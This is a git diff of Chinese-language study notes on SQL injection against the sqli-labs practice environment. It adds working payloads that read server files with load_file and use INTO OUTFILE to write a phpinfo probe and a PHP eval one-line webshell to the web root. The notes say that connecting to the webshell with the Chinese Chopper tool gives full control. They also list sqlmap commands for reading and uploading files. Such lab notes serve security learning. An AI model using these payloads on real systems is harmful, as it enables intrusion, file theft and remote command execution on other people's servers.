@@ -30,33 +30,51 @@ show global variables like "secure_file_priv"
 
 ```mysql
 mysql命令行中
-select load_file("C:\\Users\\Administrator\\Desktop\\Sqli_Analysis\\sqlread_test.txt") -- 注意要用\\而不是\
+select load_file("C:\\sqlread_test.txt") -- 注意要用\\而不是\
 ```
 
 ```
-http://localhost/sqli-labs-master/Less-1/?id=0' union select 1,2,load_file("C:\\Users\\Administrator\\Desktop\\Sqli_Analysis\\sqlread_test.txt") --+
+http://localhost/sqli-labs-master/Less-1/?id=0' union select 1,2,load_file("C:\\sqlread_test.txt") --+
 ```
 
 + 写文件
 
-'<?php phpinfo();?>'探针信息？
+'<?php phpinfo();?>' -- 会返回当前的网站配置信息
 
-id=-1')) union select 1,,3 into outfile '' --+
+```
+http://localhost/sqli-labs-master/Less-7/?id=0')) union select 1,2,'<?php phpinfo();?>' into outfile 'C:\\phpStudy\\PHPTutorial\\WWW\\sqli-labs-master\\Less-7\\1.php' --+
+```
+
+打开`1.php`发现
+
+![7_2](.\images\7_2.png)
 
 + 写入webshell
 
   + 一句话木马 -- <?php @eval($_POST['x']);?>
+
+  ```mysql
+  http://localhost/sqli-labs-master/Less-7/?id=0')) union select 1,2,'<?php @eval($_POST["x");?>' into outfile 'C:\\phpStudy\\PHPTutorial\\WWW\\sqli-labs-master\\Less-7\\1.php' --+
+  ```
+
+  
+
   + @屏蔽错误信息
   + 把输入的'x'都当做命令
-  + 使用中国菜刀可以连接，连接了以后就可以为所欲为了，x相当于连接密码
+  + 使用中国菜刀可以连接，连接了以后就可以为所欲为了，x相当于连接密码;中国菜刀有点强
+
+  ![7_3](.\images\7_3.png)
 
 + sqlmap测试
 
   + sqlmap -hh 查看详细的帮助信息
 
+  + 下列命令用于利用sqlmap读写文件，不多赘述，撸几遍代码就懂
+  
     ```
-    sqlmap -u "http://localhost/sqli/Less-7/?id=1" --file-read "G:\\flag.txt" -- 读取网站上的文件
-    sqlmap -u "" --file-write local_file --file-dest destination_filedir_in_web -- 把本地的某个文件上传到网站上某个位置
-    ```
-
+    sqlmap -u "http://localhost/sqli-labs-master/Less-7/?id=1" --file-read "G:\\flag.txt" -- 读取网站上的文件
+  
+    sqlmap -u "http://localhost/sqli-labs-master/Less-7/?id=1" --file-write local_file --file-dest destination_filedir_in_web -- 把本地的某个文件上传到网站上某个位置
+  ```
+    
     
